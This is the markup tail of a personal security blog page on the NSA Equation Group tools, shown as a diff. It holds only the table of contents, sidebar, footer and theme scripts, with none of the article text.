+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="RSS" href="/lithium.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+
+    <div class="card widget" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    Catalogue
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#Shadowbroker">
+        <span class="has-mr-6">1</span>
+        <span>Shadowbroker</span>
+        </a></li><li>
+        <a class="is-flex" href="#主要工具">
+        <span class="has-mr-6">2</span>
+        <span>主要工具</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#FUZZBUNCH：一款类似Metasploit的Exploit框架">
+        <span class="has-mr-6">2.1</span>
+        <span>FUZZBUNCH：一款类似Metasploit的Exploit框架</span>
+        </a></li><li>
+        <a class="is-flex" href="#ETERNALBLUE攻击原理分析">
+        <span class="has-mr-6">2.2</span>
+        <span>ETERNALBLUE攻击原理分析</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#漏洞复现">
+        <span class="has-mr-6">3</span>
+        <span>漏洞复现</span>
+        </a></li><li>
+        <a class="is-flex" href="#后渗透攻击">
+        <span class="has-mr-6">4</span>
+        <span>后渗透攻击</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">5</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Recent
+        </h3>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-05-09T08:06:45.000Z">2019-05-09</time></div>
+                    <a href="/2019/05/09/word2vec-presentation/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Word2vec的两种文档表示方法</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/NLP/">NLP</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-05-08T22:24:49.000Z">2019-05-09</time></div>
+                    <a href="/2019/05/09/Wordng-vec-webshell-detect/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Use Word-NG vec to detect WebShell</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/NLP/">NLP</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-05-09T00:17:26.000Z">2018-05-09</time></div>
+                    <a href="/2018/05/09/RSA-in-ctf/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CTF中RSA的常见攻击方法</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-03-21T00:22:27.000Z">2018-03-21</time></div>
+                    <a href="/2018/03/21/sqlmap-tamper-development/" class="title has-link-black-ter is-size-6 has-text-weight-normal">sqlmap tamper 脚本编写</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/hack/">hack</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2017-09-11T20:11:03.000Z">2017-09-12</time></div>
+                    <a href="/2017/09/12/MS08-067-analyze/" class="title has-link-black-ter is-size-6 has-text-weight-normal">MS08-067漏洞原理分析及还原</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/hack/">hack</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Categories
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/NLP/">
+            <span class="level-start">
+                <span class="level-item">NLP</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Tutorial/">
+            <span class="level-start">
+                <span class="level-item">Tutorial</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/hack/">
+            <span class="level-start">
+                <span class="level-item">hack</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">6</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Archives
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">March 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/09/">
+                <span class="level-start">
+                    <span class="level-item">September 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/04/">
+                <span class="level-start">
+                    <span class="level-item">April 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/02/">
+                <span class="level-start">
+                    <span class="level-item">February 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2016/10/">
+                <span class="level-start">
+                    <span class="level-item">October 2016</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Tags
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/CVE/">
+                        <span class="tag">CVE</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/N-Gram/">
+                        <span class="tag">N-Gram</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/RSA/">
+                        <span class="tag">RSA</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Sql-injection/">
+                        <span class="tag">Sql injection</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Webshell/">
+                        <span class="tag">Webshell</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Wifi/">
+                        <span class="tag">Wifi</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Word2vec/">
+                        <span class="tag">Word2vec</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/getshell/">
+                        <span class="tag">getshell</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/shadowsocks/">
+                        <span class="tag">shadowsocks</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/sqlmap/">
+                        <span class="tag">sqlmap</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Categories
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/NLP/">
+            <span class="level-start">
+                <span class="level-item">NLP</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Tutorial/">
+            <span class="level-start">
+                <span class="level-item">Tutorial</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/hack/">
+            <span class="level-start">
+                <span class="level-item">hack</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">6</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Archives
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">March 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/09/">
+                <span class="level-start">
+                    <span class="level-item">September 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/05/">
+                <span class="level-start">
+                    <span class="level-item">May 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/04/">
+                <span class="level-start">
+                    <span class="level-item">April 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/02/">
+                <span class="level-start">
+                    <span class="level-item">February 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2016/10/">
+                <span class="level-start">
+                    <span class="level-item">October 2016</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Tags
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/CVE/">
+                        <span class="tag">CVE</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/N-Gram/">
+                        <span class="tag">N-Gram</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/RSA/">
+                        <span class="tag">RSA</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Sql-injection/">
+                        <span class="tag">Sql injection</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Webshell/">
+                        <span class="tag">Webshell</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Wifi/">
+                        <span class="tag">Wifi</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Word2vec/">
+                        <span class="tag">Word2vec</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/getshell/">
+                        <span class="tag">getshell</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/shadowsocks/">
+                        <span class="tag">shadowsocks</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/sqlmap/">
+                        <span class="tag">sqlmap</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="NSA方程式工具利用与分析" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2016-2020 Lithium Atom&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
+                
+                <br>
+                <span id="busuanzi_container_site_uv">
+                Visited by <span id="busuanzi_value_site_uv">0</span> users
+                </span>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("en");</script>
+
+
+<script>
+var IcarusThemeSettings = {
+    site: {
+        url: 'https://p0st3r.github.io',
+        external_link: {"enable":true,"exclude":[]}
+    },
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+
+
+<script src="/js/animation.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+
+<a id="back-to-top" title="Back to Top" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
